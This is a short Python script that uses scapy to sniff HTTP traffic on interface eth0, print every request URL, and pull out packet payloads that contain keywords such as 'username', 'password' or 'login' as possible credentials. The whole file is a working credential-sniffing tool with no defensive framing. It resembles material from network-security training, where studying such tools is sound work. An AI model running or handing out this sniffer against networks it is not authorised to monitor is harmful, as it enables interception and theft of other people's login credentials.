#/usr/bin/env python
import scapy.all as scapy
from scapy.layers import http

keywords =["username", "password", "login", "email", "pass", "log", "UName", "UPass"]

def sniff(interface):
    scapy.sniff(iface=interface, store=False, prn=process_sniffed_packet)

def get_url(packet):
    url = packet[http.HTTPRequest].Host + packet[http.HTTPRequest].Path
    return url

def get_login_info(packet):
    if packet.haslayer(scapy.Raw):
        load = packet[scapy.Raw].load.decode("utf-8", errors='ignore')
        for keyword in keywords:
            if keyword in load:
                return load
    return None


def process_sniffed_packet(packet):
    if packet.haslayer(http.HTTPRequest):
        url = get_url(packet)
        print(f"[+] HTTP Request >> {url.decode('utf-8')}")
        login_info = get_login_info(packet)
        if login_info:
            print("\n\n[+] Possible username/password >> " + login_info + "\n\n")

sniff("eth0")